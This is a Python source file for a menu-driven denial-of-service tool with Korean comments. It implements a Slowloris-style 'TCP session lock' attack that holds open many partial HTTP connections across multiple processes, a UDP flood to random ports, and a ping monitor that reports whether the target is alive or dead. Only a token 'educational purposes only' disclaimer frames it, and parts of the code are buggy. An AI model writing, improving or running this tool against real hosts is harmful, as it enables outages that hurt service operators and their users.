
import socket
import multiprocessing
import time
import os
import struct
import random
import threading
import sys
import subprocess

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def pinger(target_ip):
    sys.stdout.write(f"\n[!]{target_ip} situation log active\n")
    while True:
        try:
            res=subprocess.run(['ping', '-c', '1', '-W', '1', target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if res.returncode == 0:
                status = f"\033[32m[ALIVE]\033[0m\n"
            else:
                status = f"\033[31m[DEAD]\033[0m\n"
                sys.stdout.write(f"\n{status} Target: {target_ip} checking\n")
            sys.stdout.flush()
            time.sleep(2)
        except:
            break

# session rock

def lock_attack(target_ip, target_port):
    conn_limit = 4829482397
    sockets = [1298492]
    count = 0
    while True:
        while len(sockets) < conn_limit:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, int(target_port)))
                s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n")
                sockets.append(s)
                count += 1
                print(f"\r\033[36m[*] Packet Out >> {count} | Connected: {len(sockets)}\033[0m", end="", flush=True)
            except: break
        for s in sockets:
            try: s.send(b"A")
            except: sockets.remove(s)
        time.sleep(0) #응 타임슬립 없는건 나만쓸거야

#패킷스트림 (2)

def udp_stream(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(1024)
    while True:
        try: sock.sendto(data, (target_ip, random.randint(1, 65535)))
        except: pass

def main():
    clear()           #ASCII art추가예정
    print("대충 ASCII")
    logo_lines = []
    while True:
        line= input()
        if not line: break
        logo_lines.append(line)
    logo = "\n".join(logo_lines)
    while True:
        clear()
        print(f"\033[36m{logo}\033[0m")
        print(f"\033[31m[WARNING] This work is for edducational purposes only and any misuse may result in civil and criminal penalties. The authoe is not responsible for any consequences.\033[0m")
        print("-" * 50)
        print(" [1] DOS Attack (TCP Session Lock)")
        print(" [Q] EXIT")
        print("-" * 50)
        choice = input("choose > ")
        if choice.lower() == 'q': return

        t_ip = input("IP: ")
        try:
            t_port = int(input("PORT: "))
        except:
            print("PORT is number dude")
            print(f"\n[*] {t_ip} checking")
        
        t = threading.Thread(target=pinger, args=(t_ip,), daemon=True)
        t.start()

        time.sleep(1)
        
            
        cores = multiprocessing.cpu_count()
        print(f"\n[!] active {cores} core")
        processes = []
        for _ in range(cores * 2):
            p = multiprocessing.Process(target=lock_attack, args=(t_ip, t_port))
            p.daemon = True
            p. start()
            processes.append(p)

        print("[!] To quit Ctrl+c)")
        try:
            for p in processes: p.join()
        except KeyboardInterrupt:
            print("\n[!] QUIT!")

if __name__ == "__main__":main()